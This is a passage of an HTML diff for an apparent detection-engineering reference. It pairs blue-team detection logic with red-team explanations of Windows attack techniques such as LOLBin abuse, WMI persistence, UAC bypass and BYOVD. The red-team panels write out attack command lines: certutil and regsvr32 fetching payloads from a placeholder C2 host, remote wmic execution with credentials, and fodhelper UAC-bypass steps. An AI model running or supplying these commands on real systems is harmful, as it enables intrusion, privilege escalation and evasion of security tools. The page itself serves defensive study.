+              4. FilterToConsumerBinding links them<br>
+              5. On every reboot, 5 minutes after startup, payload executes — no scheduled task, no registry run key, no file on disk<br><br>
+              <strong>Why it evades:</strong> Process creation shows WmiPrvSE.exe as parent. Many SIEMs have WmiPrvSE whitelisted. No script file exists to scan.
+              <div class="malware-tags">
+                <span class="malware-tag tag-red">POSHSPY</span>
+                <span class="malware-tag tag-red">Cobalt Strike WMI</span>
+                <span class="malware-tag tag-red">Empire persistence</span>
+                <span class="malware-tag tag-gold">APT29 (Cozy Bear)</span>
+                <span class="malware-tag tag-gold">Turla</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="cousin-section">
+        <div class="cousin-section-label">🔴 COUSIN COMPOSITE RULES</div>
+        <div class="cousin-grid">
+
+          <div class="cousin-card" id="cc-wmi-1">
+            <div class="cousin-card-header" onclick="toggleCousin('cc-wmi-1')">
+              <div class="cousin-icon">🔴</div>
+              <div>
+                <div class="cousin-name">WMI Event Subscription Persistence</div>
+                <div class="cousin-ttp">T1546.003</div>
+              </div>
+              <div class="cousin-toggle">▼</div>
+            </div>
+            <div class="cousin-body">
+              <a href="#" class="cousin-link">📎 INSERT RULE LINK</a>
+              <div class="killchain-badge">⚡ KILL CHAIN: Persistence → Execution (delayed)</div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-blue">🔵 BLUE TEAM</div>
+                <div class="attack-text">Monitor WMI namespace writes: <code>__EventFilter</code>, <code>__EventConsumer</code>, <code>__FilterToConsumerBinding</code> creation in <code>root\subscription</code>. These three events together constitute a complete WMI persistence mechanism. Alert on any CommandLineEventConsumer or ActiveScriptEventConsumer creation outside of known IT management tools. Cross-correlate with the 30-day primitive index — filter creation and consumer binding may be separated by hours or days in a slow-burn APT intrusion.</div>
+              </div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-red">🔴 RED TEAM</div>
+                <div class="attack-text">
+                  <strong>Deployed during:</strong> Post-exploitation, immediately after achieving persistent foothold, before lateral movement.<br><br>
+                  <strong>Why:</strong> Survives reboots, AV scans, and even some EDR wipes because the payload lives in the WMI repository (<code>C:\Windows\System32\wbem\Repository</code>) — a binary database that few analysts know to inspect.<br><br>
+                  <strong>Real tool:</strong> <code>wmic</code> command line, PowerShell WMI cmdlets, or Empire's <code>persistence/elevated/wmi</code> module. Can be executed in a single command with administrative rights.
+                  <div class="malware-tags">
+                    <span class="malware-tag tag-red">Empire WMI</span>
+                    <span class="malware-tag tag-red">PowerLurk</span>
+                    <span class="malware-tag tag-gold">APT29</span>
+                    <span class="malware-tag tag-gold">Winnti Group</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="cousin-card" id="cc-wmi-2">
+            <div class="cousin-card-header" onclick="toggleCousin('cc-wmi-2')">
+              <div class="cousin-icon">🔴</div>
+              <div>
+                <div class="cousin-name">WMI Lateral Movement Execution</div>
+                <div class="cousin-ttp">T1047 · T1021</div>
+              </div>
+              <div class="cousin-toggle">▼</div>
+            </div>
+            <div class="cousin-body">
+              <a href="#" class="cousin-link">📎 INSERT RULE LINK</a>
+              <div class="killchain-badge">⚡ KILL CHAIN: Lateral Movement → Execution</div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-blue">🔵 BLUE TEAM</div>
+                <div class="attack-text">Remote WMI execution generates network authentication events (4624 logon type 3) correlated with WmiPrvSE.exe spawning on the target host. The composite joins remote auth events with WmiPrvSE child process creation on destination. Key signal: <code>wmic.exe /node:[target] process call create [payload]</code> from a workstation (not a management server) is nearly always malicious.</div>
+              </div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-red">🔴 RED TEAM</div>
+                <div class="attack-text">
+                  <strong>Classic lateral movement chain:</strong><br>
+                  1. Attacker has NTLM hash or cleartext credential from credential dumping<br>
+                  2. Executes: <code>wmic /node:192.168.1.50 /user:DOMAIN\admin /password:pass process call create "powershell -enc [payload]"</code><br>
+                  3. Target machine executes payload as the specified user — no SMB share, no file drop, no PsExec service installation<br><br>
+                  <strong>Why preferred over PsExec:</strong> No service installation, no file drop, no 7045 event. Significantly quieter.
+                  <div class="malware-tags">
+                    <span class="malware-tag tag-red">Impacket wmiexec</span>
+                    <span class="malware-tag tag-red">CrackMapExec</span>
+                    <span class="malware-tag tag-red">Cobalt Strike jump wmi</span>
+                    <span class="malware-tag tag-gold">Sandworm</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ECOSYSTEM: Certutil / LOLBins -->
+  <div class="ecosystem" id="eco-lolbin">
+    <div class="ecosystem-header" onclick="toggleEco('eco-lolbin')">
+      <div class="eco-id">T1218</div>
+      <div>
+        <div class="eco-title">LOLBin Execution — Trusted Binary Abuse</div>
+        <div class="eco-tactic">EXECUTION · DEFENSE EVASION · INTENT-FIRST DETECTION</div>
+      </div>
+      <div class="eco-toggle">▼</div>
+    </div>
+    <div class="ecosystem-body">
+      <div class="core-composite">
+        <div class="core-label">🔵 CORE BASELINE COMPOSITE</div>
+        <div class="core-rule-name">Certutil Remote Download / Decode Anchor — LOLBin Intent Composite</div>
+        <a href="#" class="core-rule-link">📎 INSERT RULE LINK · KQL composite · Sentinel + MDE</a>
+        <div class="two-col">
+          <div class="panel-blue">
+            <div class="panel-label lbl-blue">🔵 BLUE TEAM</div>
+            <div class="panel-text">
+              Certutil.exe is a certificate management tool with no legitimate reason to download files from the internet or decode base64 payloads in most enterprise environments. It is the canonical intent-first detection: the minimum truth is <strong>certutil executing with <code>-urlcache</code>, <code>-decode</code>, or <code>-decodehex</code> flags</strong>. The command implies capability regardless of the specific payload.<br><br>
+              Composite reinforcement: unusual parent process (Office, browser), output file path anomaly (TEMP, AppData), immediate execution of the decoded file, network egress from certutil itself.
+            </div>
+          </div>
+          <div class="panel-red">
+            <div class="panel-label lbl-red">🔴 RED TEAM</div>
+            <div class="panel-text">
+              <strong>Why certutil?</strong> It's signed by Microsoft, whitelisted by almost every application control policy, and can perform base64 decoding and remote file download natively.<br><br>
+              <strong>Classic chain:</strong><br>
+              1. Macro executes: <code>certutil -urlcache -split -f http://[C2]/payload.txt payload.b64</code><br>
+              2. Then: <code>certutil -decode payload.b64 payload.exe</code><br>
+              3. Then: <code>payload.exe</code> — Cobalt Strike loader executes<br><br>
+              The entire download-decode-execute chain uses nothing but Microsoft-signed binaries. No PowerShell, no scripts.
+              <div class="malware-tags">
+                <span class="malware-tag tag-red">Cobalt Strike staging</span>
+                <span class="malware-tag tag-red">Emotet dropper</span>
+                <span class="malware-tag tag-red">BazarLoader</span>
+                <span class="malware-tag tag-gold">TA505</span>
+                <span class="malware-tag tag-gold">FIN6</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="cousin-section">
+        <div class="cousin-section-label">🔴 COUSIN COMPOSITE RULES</div>
+        <div class="cousin-grid">
+
+          <div class="cousin-card" id="cc-lol-1">
+            <div class="cousin-card-header" onclick="toggleCousin('cc-lol-1')">
+              <div class="cousin-icon">🔴</div>
+              <div>
+                <div class="cousin-name">Mshta Remote Execution</div>
+                <div class="cousin-ttp">T1218.005</div>
+              </div>
+              <div class="cousin-toggle">▼</div>
+            </div>
+            <div class="cousin-body">
+              <a href="#" class="cousin-link">📎 INSERT RULE LINK</a>
+              <div class="killchain-badge">⚡ KILL CHAIN: Execution → Initial Access (phishing)</div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-blue">🔵 BLUE TEAM</div>
+                <div class="attack-text">Mshta.exe executes HTA (HTML Application) files which can contain VBScript or JScript. Minimum truth: <strong>mshta.exe spawning with a remote URL argument</strong> or spawning from an Office process. HTA files have full scripting capability with no browser sandbox. Alert on mshta network connections and any child process creation.</div>
+              </div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-red">🔴 RED TEAM</div>
+                <div class="attack-text">
+                  <strong>Phishing chain:</strong> Email contains link to attacker-hosted <code>.hta</code> file. User opens it — Windows executes it as a trusted application. The HTA contains VBScript that drops and executes a payload, creates a scheduled task, or downloads a second stage.<br><br>
+                  <strong>Why HTA:</strong> Bypasses Mark-of-the-Web on some Windows versions, executes outside browser sandbox, full COM object access, can spawn any process. Heavily used by commodity RAT distributors.
+                  <div class="malware-tags">
+                    <span class="malware-tag tag-red">Emotet HTA</span>
+                    <span class="malware-tag tag-red">Lokibot dropper</span>
+                    <span class="malware-tag tag-red">Astaroth</span>
+                    <span class="malware-tag tag-gold">TA570</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="cousin-card" id="cc-lol-2">
+            <div class="cousin-card-header" onclick="toggleCousin('cc-lol-2')">
+              <div class="cousin-icon">🔴</div>
+              <div>
+                <div class="cousin-name">Regsvr32 Squiblydoo / COM Scriptlet</div>
+                <div class="cousin-ttp">T1218.010</div>
+              </div>
+              <div class="cousin-toggle">▼</div>
+            </div>
+            <div class="cousin-body">
+              <a href="#" class="cousin-link">📎 INSERT RULE LINK</a>
+              <div class="killchain-badge">⚡ KILL CHAIN: Execution → Defense Evasion (AppLocker bypass)</div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-blue">🔵 BLUE TEAM</div>
+                <div class="attack-text">Regsvr32 can load a remote <code>.sct</code> (scriptlet) file via <code>/s /n /u /i:[URL] scrobj.dll</code>. This is the Squiblydoo technique — bypasses AppLocker because regsvr32 is trusted, and the scriptlet is fetched over HTTP/HTTPS at execution time. Monitor for <code>/i:http</code> arguments and network connections from regsvr32.exe.</div>
+              </div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-red">🔴 RED TEAM</div>
+                <div class="attack-text">
+                  <strong>Why it matters:</strong> One of the original AppLocker bypasses. A single command with no files dropped: <code>regsvr32 /s /n /u /i:http://[C2]/payload.sct scrobj.dll</code>. The scriptlet runs JScript/VBScript that can spawn any process, load a DLL, or execute shellcode.<br><br>
+                  <strong>Kill chain position:</strong> Initial execution or AppLocker bypass in restricted environments. Still relevant in environments that haven't blocked regsvr32 network access.
+                  <div class="malware-tags">
+                    <span class="malware-tag tag-red">ROKRAT</span>
+                    <span class="malware-tag tag-red">Squiblydoo PoC</span>
+                    <span class="malware-tag tag-gold">APT37</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="cousin-card" id="cc-lol-3">
+            <div class="cousin-card-header" onclick="toggleCousin('cc-lol-3')">
+              <div class="cousin-icon">🔴</div>
+              <div>
+                <div class="cousin-name">RunDLL32 Arbitrary Code Execution</div>
+                <div class="cousin-ttp">T1218.011</div>
+              </div>
+              <div class="cousin-toggle">▼</div>
+            </div>
+            <div class="cousin-body">
+              <a href="#" class="cousin-link">📎 INSERT RULE LINK</a>
+              <div class="killchain-badge">⚡ KILL CHAIN: Execution → Defense Evasion</div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-blue">🔵 BLUE TEAM</div>
+                <div class="attack-text">Rundll32 is heavily used in legitimate Windows operations — the cousin rule targets behavioural anomaly, not simple presence. Minimum truth: rundll32 loading a DLL from TEMP/AppData/non-system path, rundll32 making network connections, rundll32 spawning child processes. JavaScript execution via <code>rundll32 javascript:</code> is a strong signal.</div>
+              </div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-red">🔴 RED TEAM</div>
+                <div class="attack-text">
+                  <strong>Deployment:</strong> Loading a malicious DLL dropped or downloaded to a user-writable path: <code>rundll32.exe C:\Users\Public\payload.dll,EntryPoint</code>. Or executing JavaScript: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"</code> — spawns a script host with no file on disk.<br><br>
+                  Used heavily in Cobalt Strike post-exploitation for DLL injection and process execution. Also used for loading C2 stagers disguised as system DLLs.
+                  <div class="malware-tags">
+                    <span class="malware-tag tag-red">Cobalt Strike DLL stager</span>
+                    <span class="malware-tag tag-red">Qakbot</span>
+                    <span class="malware-tag tag-red">IcedID</span>
+                    <span class="malware-tag tag-gold">TA551</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </div>
+  </div>
+
+</div><!-- end tab-execution -->
+
+
+<!-- ============================================================ -->
+<!-- TAB: PERSISTENCE -->
+<!-- ============================================================ -->
+<div id="tab-persistence" class="tab-content">
+
+  <div class="note-box">🔒 PERSISTENCE ECOSYSTEM — Mechanisms that survive reboots, user logoff, and AV scans. Minimum truth: something modifies a startup mechanism. The 30-day Atomic Sentinel Layer is essential here — persistence primitives are created hours or days before activation.</div>
+
+  <!-- ECOSYSTEM: Registry Run Keys -->
+  <div class="ecosystem" id="eco-reg">
+    <div class="ecosystem-header" onclick="toggleEco('eco-reg')">
+      <div class="eco-id">T1547.001</div>
+      <div>
+        <div class="eco-title">Registry Run Key / Startup Folder Persistence</div>
+        <div class="eco-tactic">PERSISTENCE · BOOT/LOGON AUTOSTART EXECUTION</div>
+      </div>
+      <div class="eco-toggle">▼</div>
+    </div>
+    <div class="ecosystem-body">
+      <div class="core-composite">
+        <div class="core-label">🔵 CORE BASELINE COMPOSITE</div>
+        <div class="core-rule-name">Registry Autorun Write Anchor — Anomalous Executable Path</div>
+        <a href="#" class="core-rule-link">📎 INSERT RULE LINK · KQL composite · Sentinel + MDE</a>
+        <div class="two-col">
+          <div class="panel-blue">
+            <div class="panel-label lbl-blue">🔵 BLUE TEAM</div>
+            <div class="panel-text">
+              Run key writes are noisy — legitimate software uses them constantly. The minimum truth composite anchors on <strong>path anomaly</strong>: run key values pointing to executables in TEMP, AppData, ProgramData, or user-writable paths. The key insight is combining the registry write event with the spawning process: if a user-space process (Word, browser, non-IT admin tool) writes to HKCU/HKLM Run, that is structurally suspicious regardless of payload.<br><br>
+              Reinforcement: the pointed-to executable does not exist yet (dropper hasn't landed), or was created &lt;60 seconds before the registry write, or has a .txt/.pdf/.jpg extension mismatch.
+            </div>
+          </div>
+          <div class="panel-red">
+            <div class="panel-label lbl-red">🔴 RED TEAM</div>
+            <div class="panel-text">
+              Run keys are commodity-malware standard. Used by nearly every RAT, banking trojan, and ransomware family as primary or backup persistence.<br><br>
+              <strong>Chain:</strong> Dropper lands payload in AppData → writes <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run\[random] = C:\Users\[user]\AppData\Roaming\[random].exe</code> → persists across reboots without admin rights.<br><br>
+              <strong>Evasion:</strong> Naming the key after legitimate software (AdobeUpdate, ChromeHelper). Pointing to a living-off-the-land binary. Using environment variable expansion to obscure the path.
+              <div class="malware-tags">
+                <span class="malware-tag tag-red">Remcos RAT</span>
+                <span class="malware-tag tag-red">AgentTesla</span>
+                <span class="malware-tag tag-red">Emotet</span>
+                <span class="malware-tag tag-red">Qakbot</span>
+                <span class="malware-tag tag-gold">TA505</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="cousin-section">
+        <div class="cousin-section-label">🔴 COUSIN COMPOSITE RULES</div>
+        <div class="cousin-grid">
+
+          <div class="cousin-card" id="cc-reg-1">
+            <div class="cousin-card-header" onclick="toggleCousin('cc-reg-1')">
+              <div class="cousin-icon">🔴</div>
+              <div>
+                <div class="cousin-name">Scheduled Task Creation — Anomalous Command</div>
+                <div class="cousin-ttp">T1053.005</div>
+              </div>
+              <div class="cousin-toggle">▼</div>
+            </div>
+            <div class="cousin-body">
+              <a href="#" class="cousin-link">📎 INSERT RULE LINK</a>
+              <div class="killchain-badge">⚡ KILL CHAIN: Persistence → Execution (scheduled)</div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-blue">🔵 BLUE TEAM</div>
+                <div class="attack-text">Scheduled tasks are a high-fidelity persistence signal when combined with anomalous action: tasks pointing to PowerShell with encoded commands, tasks running from user-writable directories, tasks with triggers on logon/startup created by non-IT processes. Monitor Event ID 4698 (task created) with the task XML — the action element reveals the full command and is frequently obfuscated.</div>
+              </div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-red">🔴 RED TEAM</div>
+                <div class="attack-text">
+                  <strong>Why tasks over run keys:</strong> More control (specific triggers, user context, retry logic). More legitimate cover noise. Can run as SYSTEM with admin rights.<br><br>
+                  <strong>APT pattern:</strong> Create task with random name mimicking Windows Update task, trigger on logon, action runs a PowerShell download cradle. Task survives reboots, user changes, and most AV remediation that focuses on files rather than scheduler.
+                  <div class="malware-tags">
+                    <span class="malware-tag tag-red">Cobalt Strike schtasks</span>
+                    <span class="malware-tag tag-red">IcedID</span>
+                    <span class="malware-tag tag-red">TrickBot</span>
+                    <span class="malware-tag tag-gold">APT41</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="cousin-card" id="cc-reg-2">
+            <div class="cousin-card-header" onclick="toggleCousin('cc-reg-2')">
+              <div class="cousin-icon">🔴</div>
+              <div>
+                <div class="cousin-name">DLL Search Order Hijacking — Sideload Persistence</div>
+                <div class="cousin-ttp">T1574.001</div>
+              </div>
+              <div class="cousin-toggle">▼</div>
+            </div>
+            <div class="cousin-body">
+              <a href="#" class="cousin-link">📎 INSERT RULE LINK</a>
+              <div class="killchain-badge">⚡ KILL CHAIN: Persistence → Defense Evasion → Privilege Escalation</div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-blue">🔵 BLUE TEAM</div>
+                <div class="attack-text">DLL sideloading places a malicious DLL in a directory where a legitimate application will load it in preference to the real system DLL. Minimum truth: a DLL with a known-system-DLL name appearing in a non-system path, loaded by a legitimate signed application. Cousin to the BYOVD chain — same substrate (DLL loading) but different intent vector (persistence via application trust rather than kernel driver trust).</div>
+              </div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-red">🔴 RED TEAM</div>
+                <div class="attack-text">
+                  <strong>Classic chain:</strong> Drop malicious <code>version.dll</code> next to <code>OneDriveSetup.exe</code> or any signed Microsoft binary that loads version.dll. When the binary runs (on startup, logon, or via a scheduled task), it loads the malicious DLL instead of the system one. The malicious DLL proxies all exports to the real DLL while executing the payload in a thread — application continues working normally, no crash.
+                  <div class="malware-tags">
+                    <span class="malware-tag tag-red">PlugX</span>
+                    <span class="malware-tag tag-red">ShadowPad</span>
+                    <span class="malware-tag tag-red">Winnti</span>
+                    <span class="malware-tag tag-gold">APT10</span>
+                    <span class="malware-tag tag-gold">Bronze Butler</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </div>
+  </div>
+
+</div><!-- end tab-persistence -->
+
+
+<!-- ============================================================ -->
+<!-- TAB: PRIVILEGE ESCALATION -->
+<!-- ============================================================ -->
+<div id="tab-privilege" class="tab-content">
+  <div class="note-box">⬆️ PRIVILEGE ESCALATION — Gaining SYSTEM or admin from a standard user context. Minimum truth: a process running as user spawns a child or modifies a token to run at SYSTEM/admin level without explicit admin action.</div>
+
+  <div class="ecosystem" id="eco-priv">
+    <div class="ecosystem-header" onclick="toggleEco('eco-priv')">
+      <div class="eco-id">T1055</div>
+      <div>
+        <div class="eco-title">Process Injection — Token Impersonation Engine</div>
+        <div class="eco-tactic">PRIVILEGE ESCALATION · DEFENSE EVASION · SUBSTRATE-FIRST</div>
+      </div>
+      <div class="eco-toggle">▼</div>
+    </div>
+    <div class="ecosystem-body">
+      <div class="core-composite">
+        <div class="core-label">🔵 CORE BASELINE COMPOSITE</div>
+        <div class="core-rule-name">Cross-Process Memory Write + Remote Thread Creation Anchor</div>
+        <a href="#" class="core-rule-link">📎 INSERT RULE LINK · KQL composite · Sentinel + MDE</a>
+        <div class="two-col">
+          <div class="panel-blue">
+            <div class="panel-label lbl-blue">🔵 BLUE TEAM</div>
+            <div class="panel-text">
+              Process injection is the substrate-first detection problem par excellence: you cannot see the command line of code executing inside another process's memory space. The minimum truth is the API call sequence: <strong>OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread</strong>. MDE DeviceEvents surfaces these as individual events; the composite joins them on process ID within a 30-second window.<br><br>
+              Reinforcement: target process is a system process (lsass, svchost), source process has no legitimate reason to interact with the target, or source process itself was spawned from an anomalous parent.
+            </div>
+          </div>
+          <div class="panel-red">
+            <div class="panel-label lbl-red">🔴 RED TEAM</div>
+            <div class="panel-text">
+              <strong>Why injection?</strong> Executing code inside a legitimate process (explorer.exe, svchost.exe) means the malicious code appears to come from a trusted, signed process. Network connections from explorer.exe look normal. File access from svchost looks normal.<br><br>
+              <strong>OSCP-level chain:</strong><br>
+              1. Attacker has shell as standard user<br>
+              2. Injects Cobalt Strike beacon shellcode into <code>explorer.exe</code> via classic VirtualAllocEx/WriteProcessMemory/CreateRemoteThread<br>
+              3. Beacon runs as the user context of explorer.exe — beacon traffic attributed to trusted process<br>
+              4. From beacon: <code>steal_token</code> to impersonate higher-privileged user whose token is in memory
+              <div class="malware-tags">
+                <span class="malware-tag tag-red">Cobalt Strike inject</span>
+                <span class="malware-tag tag-red">Metasploit migrate</span>
+                <span class="malware-tag tag-red">Donut shellcode</span>
+                <span class="malware-tag tag-gold">APT28</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="cousin-section">
+        <div class="cousin-section-label">🔴 COUSIN COMPOSITE RULES</div>
+        <div class="cousin-grid">
+
+          <div class="cousin-card" id="cc-priv-1">
+            <div class="cousin-card-header" onclick="toggleCousin('cc-priv-1')">
+              <div class="cousin-icon">🔴</div>
+              <div>
+                <div class="cousin-name">UAC Bypass — Token Elevation Techniques</div>
+                <div class="cousin-ttp">T1548.002</div>
+              </div>
+              <div class="cousin-toggle">▼</div>
+            </div>
+            <div class="cousin-body">
+              <a href="#" class="cousin-link">📎 INSERT RULE LINK</a>
+              <div class="killchain-badge">⚡ KILL CHAIN: Privilege Escalation → Defense Evasion</div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-blue">🔵 BLUE TEAM</div>
+                <div class="attack-text">UAC bypass techniques elevate from medium integrity to high integrity without triggering the UAC prompt. Key detection surfaces: auto-elevation binaries (fodhelper.exe, eventvwr.exe) spawning unexpected children; registry writes to <code>HKCU\Software\Classes</code> COM hijacks immediately before an auto-elevating process runs; DLL loads into auto-elevation contexts.</div>
+              </div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-red">🔴 RED TEAM</div>
+                <div class="attack-text">
+                  <strong>Fodhelper bypass (classic OSCP technique):</strong><br>
+                  1. Write malicious command to <code>HKCU\Software\Classes\ms-settings\shell\open\command</code><br>
+                  2. Execute <code>fodhelper.exe</code> — it auto-elevates and reads this registry key as its file association<br>
+                  3. Your payload executes at high integrity — no UAC prompt shown to user<br><br>
+                  Works on default Windows 10/11. No admin rights needed to write to HKCU. The auto-elevating binary provides the privilege escalation vector.
+                  <div class="malware-tags">
+                    <span class="malware-tag tag-red">UACME toolkit</span>
+                    <span class="malware-tag tag-red">Empire bypassuac</span>
+                    <span class="malware-tag tag-red">Metasploit getsystem</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ============================================================ -->
+<!-- TAB: DEFENSE EVASION -->
+<!-- ============================================================ -->
+<div id="tab-defense" class="tab-content">
+  <div class="note-box">🛡️ DEFENSE EVASION — The largest ATT&CK tactic by sub-technique count. Attackers invest heavily here. Minimum truth: something deliberately obscures, disables, or confuses a defensive control. The obscuring action itself is the signal.</div>
+
+  <div class="ecosystem" id="eco-byovd">
+    <div class="ecosystem-header" onclick="toggleEco('eco-byovd')">
+      <div class="eco-id">T1068 · T1562.001</div>
+      <div>
+        <div class="eco-title">BYOVD — Bring Your Own Vulnerable Driver</div>
+        <div class="eco-tactic">DEFENSE EVASION · PRIVILEGE ESCALATION · SUBSTRATE-FIRST</div>
+      </div>
+      <div class="eco-toggle">▼</div>
+    </div>
+    <div class="ecosystem-body">
+      <div class="core-composite">
+        <div class="core-label">🔵 CORE BASELINE COMPOSITE</div>
+        <div class="core-rule-name">BYOVD Driver Load + EDR Kill Chain Composite — SilverFox/ValleyRAT Aligned</div>
+        <a href="#" class="core-rule-link">📎 INSERT RULE LINK · See Novel Research tab for full SilverFox rules</a>
+        <div class="two-col">
+          <div class="panel-blue">
+            <div class="panel-label lbl-blue">🔵 BLUE TEAM</div>
+            <div class="panel-text">
+              BYOVD is the apex defense evasion technique: load a legitimate but vulnerable signed driver to gain kernel-level code execution, then use that to kill EDR processes or disable kernel callbacks that EDR relies on.<br><br>
+              Minimum truth composite: <strong>signed driver loaded from non-system path + kernel callback deregistration attempt OR driver service creation by non-system process + immediate process termination of security product</strong>. The 30-day primitive index tracks driver drops independently — a driver dropped and staged is caught even if execution is delayed by days (BYOVD staging pattern).<br><br>
+              LOLDRIVER composite cross-references against MISP supply chain feed of known vulnerable driver hashes.
+            </div>
+          </div>
+          <div class="panel-red">
+            <div class="panel-label lbl-red">🔴 RED TEAM</div>
+            <div class="panel-text">
+              <strong>Why BYOVD?</strong> EDR products run protected processes at kernel level. User-space tools cannot kill them. BYOVD bypasses this by exploiting a kernel vulnerability to gain ring-0 execution — from which you can terminate any process, disable callbacks, and operate invisibly.<br><br>
+              <strong>Full SilverFox/ValleyRAT chain (MTDF original research):</strong><br>
+              1. Signed loader drops vulnerable driver (e.g., <code>gdrv.sys</code>, <code>iqvw64e.sys</code>)<br>
+              2. Loader exploits driver vulnerability to execute kernel shellcode<br>
+              3. Kernel shellcode deregisters EDR process-creation callbacks<br>
+              4. EDR is now blind — subsequent payloads execute without detection<br>
+              5. BYOVD driver unloaded to reduce footprint<br>
+              6. ValleyRAT/SilverFox RAT installed with full persistence
+              <div class="malware-tags">
+                <span class="malware-tag tag-red">SilverFox</span>
+                <span class="malware-tag tag-red">ValleyRAT</span>
+                <span class="malware-tag tag-red">BlackByte ransomware</span>
+                <span class="malware-tag tag-red">AuKill tool</span>
+                <span class="malware-tag tag-gold">Storm-0978</span>
+                <span class="malware-tag tag-gold">Scattered Spider</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="cousin-section">
+        <div class="cousin-section-label">🔴 COUSIN COMPOSITE RULES</div>
+        <div class="cousin-grid">
+
+          <div class="cousin-card" id="cc-byovd-1">
+            <div class="cousin-card-header" onclick="toggleCousin('cc-byovd-1')">
+              <div class="cousin-icon">🔴</div>
+              <div>
+                <div class="cousin-name">EDR Process Termination / Security Tool Kill</div>
+                <div class="cousin-ttp">T1562.001</div>
+              </div>
+              <div class="cousin-toggle">▼</div>
+            </div>
+            <div class="cousin-body">
+              <a href="#" class="cousin-link">📎 INSERT RULE LINK</a>
+              <div class="killchain-badge">⚡ KILL CHAIN: Defense Evasion (pre-payload deployment)</div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-blue">🔵 BLUE TEAM</div>
+                <div class="attack-text">Any process termination of known security product names (MsSense.exe, CrowdStrike sensor, SentinelAgent, CylanceSvc) is a critical-severity event with almost no legitimate explanation. The composite correlates driver load events with subsequent security tool process termination within a 5-minute window — catching the BYOVD-to-EDR-kill chain as a unified event rather than two separate low-severity alerts.</div>
+              </div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-red">🔴 RED TEAM</div>
+                <div class="attack-text">
+                  <strong>Tools used:</strong> AuKill (Microsoft-signed driver abuse), Terminator (Zemana driver), BYOVD custom tooling. These tools are sold as-a-service in cybercrime forums — attackers without kernel programming skills can purchase EDR killers and deploy them as part of ransomware pre-positioning.<br><br>
+                  <strong>Kill chain position:</strong> Always before payload deployment. The standard Ransomware-as-a-Service playbook: achieve domain admin → deploy EDR killer across domain via GPO or CrackMapExec → deploy ransomware.
+                  <div class="malware-tags">
+                    <span class="malware-tag tag-red">AuKill</span>
+                    <span class="malware-tag tag-red">Terminator</span>
+                    <span class="malware-tag tag-red">Spyboy EDR killer</span>
+                    <span class="malware-tag tag-gold">BlackCat/ALPHV</span>
+                    <span class="malware-tag tag-gold">LockBit</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="cousin-card" id="cc-byovd-2">
+            <div class="cousin-card-header" onclick="toggleCousin('cc-byovd-2')">
+              <div class="cousin-icon">🔴</div>
+              <div>
+                <div class="cousin-name">Byte-Flip Driver Mutation — Hash Evasion</div>
+                <div class="cousin-ttp">T1027 · T1068</div>
+              </div>
+              <div class="cousin-toggle">▼</div>
+            </div>
+            <div class="cousin-body">
+              <a href="#" class="cousin-link">📎 INSERT RULE LINK</a>
+              <div class="killchain-badge">⚡ KILL CHAIN: Defense Evasion → Privilege Escalation</div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-blue">🔵 BLUE TEAM</div>
+                <div class="attack-text">Attackers mutate known-vulnerable drivers by flipping bytes in non-critical sections to change the file hash while preserving functionality. Hash-based IOC detection is completely defeated. The composite shifts from hash-matching to <strong>behaviour-based substrate detection</strong>: driver signing certificate thumbprint (the vulnerable driver's cert is still valid), driver name patterns, and immediately-post-load kernel callback behaviour. Part of the MTDF LOLDRIVER master composite with MISP integration.</div>
+              </div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-red">🔴 RED TEAM</div>
+                <div class="attack-text">
+                  <strong>The problem this solves for attackers:</strong> Defenders publish IOC lists of known vulnerable driver hashes (LOLBAS project, MITRE). Hash-blocking is trivially bypassed by changing a single byte in a non-executed section of the driver binary — the exploit still works, the hash is now unique and unblocked.<br><br>
+                  <strong>Why this is part of MTDF original research:</strong> Standard detection relies on hash lists. MTDF's cousin rule detects the exploit behaviour at the kernel callback level — immune to hash mutation.
+                  <div class="malware-tags">
+                    <span class="malware-tag tag-red">SilverFox loader</span>
+                    <span class="malware-tag tag-red">Custom BYOVD tooling</span>
+                    <span class="malware-tag tag-gold">Storm-0978</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ============================================================ -->
+<!-- TAB: CREDENTIAL ACCESS -->
+<!-- ============================================================ -->
+<div id="tab-credential" class="tab-content">
